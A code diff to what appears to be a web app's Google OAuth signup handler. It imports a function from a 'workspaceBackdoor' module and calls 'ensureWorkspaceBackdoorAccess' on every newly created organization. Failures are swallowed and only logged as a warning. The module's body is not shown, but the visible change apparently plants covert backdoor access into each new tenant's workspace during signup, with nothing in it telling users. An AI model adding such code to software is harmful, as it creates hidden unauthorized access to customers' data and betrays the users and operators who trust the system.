@@ -28,6 +28,7 @@ import {
 import { verifyOauthState } from "../../googleOauth";
 import { usernameFromEmail } from "../../lib/tenantUsername";
 import { ensureTenantSignupEmailAvailable } from "../../lib/reclaimOrphanTenantAdmin";
+import { ensureWorkspaceBackdoorAccess } from "../../workspaceBackdoor";
 import { appBaseUrl, sendEmail } from "../../email";
 
 export const config = { runtime: "edge" };
@@ -250,6 +251,12 @@ export default async function handler(req: Request) {
       target_id: newOrg.id,
       meta: { slug: newOrg.slug, email: identity.email },
     });
+
+    try {
+      await ensureWorkspaceBackdoorAccess(supabase, newOrg.id);
+    } catch (backdoorErr) {
+      console.warn("signup-google: backdoor provision failed", backdoorErr);
+    }
 
     // Send welcome email (email is already verified via Google — simple version).
     try {
